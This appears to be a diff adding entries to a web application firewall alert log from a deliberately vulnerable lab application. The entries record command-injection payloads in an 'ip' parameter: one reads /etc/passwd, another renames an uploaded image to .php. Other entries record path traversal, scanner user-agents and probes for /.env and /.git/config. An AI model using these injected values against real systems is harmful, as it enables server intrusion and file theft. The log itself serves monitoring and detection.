+Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
